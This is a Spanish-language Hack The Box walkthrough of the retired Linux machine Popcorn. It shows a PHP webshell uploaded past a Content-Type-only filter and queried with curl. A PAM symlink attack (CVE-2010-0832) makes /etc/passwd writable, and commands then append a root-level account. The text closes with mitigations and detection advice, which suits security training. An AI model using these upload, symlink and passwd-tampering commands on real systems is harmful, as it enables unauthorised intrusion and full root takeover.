---
machine: Popcorn
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, web, upload, pam, dirtycow, privesc]
---

# Popcorn — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Torrent Hoster permite registrarse y subir una imagen para cada torrent. El filtro solo valida el `Content-Type`, no la extensión ni el contenido: una webshell `.php` enviada como `image/png` se ejecuta desde `/torrent/upload/` y da una shell como `www-data`. La máquina es Ubuntu 9.10 con un PAM antiguo vulnerable a CVE-2010-0832: al iniciar sesión, `~/.cache` se crea como root. Reemplazándolo por un enlace a `/etc/passwd` y volviendo a entrar por SSH, se consigue escritura en el archivo y se añade un usuario root. Dirty COW es la alternativa de kernel.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22` OpenSSH 5.1p1.
- `80` Apache 2.2.12 sobre Ubuntu 9.10.
- La raíz es la página por defecto; `gobuster` encuentra `/test`, `/rename` y `/torrent`.

`/test` es un `phpinfo()`; `/torrent` es Torrent Hoster, con registro, login y subida de torrents.

## Enumeración

Se crea una cuenta, se sube un `.torrent` válido y se edita para adjuntar una imagen. La imagen se sirve desde:

```text
/torrent/thumbnail.php?gd=2&src=./upload/<hash>.png&maxw=96
```

`/torrent/upload/` permite listar los archivos. La aplicación valida el tipo de archivo de subida, pero no de forma coherente.

## Foothold

Se prueba el filtro cambiando una cosa cada vez:

- cambiar la extensión a `.php` no se bloquea;
- cambiar el `Content-Type` a `application/x-php` sí se bloquea;
- cambiar solo el contenido no se bloquea.

Por tanto, se envía una webshell PHP con nombre `.php` y `Content-Type: image/png`:

```bash
curl -s 'http://<IP>/torrent/upload/<hash>.php?cmd=id'
```

La respuesta confirma `www-data`. Con `cmd` se lanza una reverse shell y se obtiene acceso interactivo.

## Movimiento lateral

No hay salto: `www-data` puede leer la flag de `george` y enumerar su home. Allí aparece `.cache/motd.legal-displayed`, creado por PAM al iniciar sesión.

## Escalada de privilegios

El PAM de Ubuntu 9.10 crea `~/.cache` con propietario root al autenticar. El exploit de CVE-2010-0832 elimina ese directorio, lo sustituye por un enlace simbólico al archivo objetivo y fuerza un nuevo login por SSH; el archivo pasa a ser propiedad del usuario.

Para hacerlo manualmente:

```bash
# como www-data, con una clave SSH propia en authorized_keys
rm -rf ~/.cache
ln -s /etc/passwd ~/.cache
ssh -i key www-data@<IP> true
ls -l /etc/passwd
```

Tras el login, `/etc/passwd` es escribible por `www-data`. Se genera un hash y se añade una cuenta con UID/GID 0:

```bash
openssl passwd -1 '<PASSWORD>'
echo 'pwned:<HASH>:0:0:pwned:/root:/bin/bash' >> /etc/passwd
su - pwned
```

La alternativa es Dirty COW: el kernel `2.6.31` es vulnerable, y `dirty.c` modifica `/etc/passwd` para crear un usuario root.

## Evidencia

- `phpinfo()` en `/test` y formulario de subida en `/torrent`.
- Webshell ejecutando `id` como `www-data`.
- `.cache/motd.legal-displayed` en la home de `george`.
- `/etc/passwd` con propietario `www-data` tras el segundo login.
- `id` con UID 0.

## Lecciones aprendidas

- Validar solo el `Content-Type` no impide subir código ejecutable.
- Un directorio de subida dentro del webroot convierte una imagen en una webshell.
- Los sistemas antiguos acumulan vulnerabilidades de PAM y de kernel.
- Un archivo creado por root en una ruta controlada por el usuario puede cambiar la propiedad de archivos críticos.

## Mitigaciones y detección

- Validar extensión, MIME real, magic bytes y contenido; renombrar y servir fuera del webroot.
- Deshabilitar la ejecución PHP en directorios de subida.
- Actualizar PAM y el kernel; no permitir que `~/.cache` sea un enlace.
- Monitorizar cambios de propietario en `/etc/passwd` y `/etc/shadow`.
- Detectar archivos `.php` en `upload/`, peticiones a webshells y logins SSH repetidos desde la misma cuenta.

## Referencias

- [0xdf — Popcorn](https://0xdf.gitlab.io/2020/06/23/htb-popcorn.html)
- [IppSec — Popcorn](https://www.youtube.com/watch?v=NMGsnPSm8iw)
- [NVD — CVE-2010-0832](https://nvd.nist.gov/vuln/detail/CVE-2010-0832)
- [Hack The Box — Popcorn](https://app.hackthebox.com/machines/popcorn)
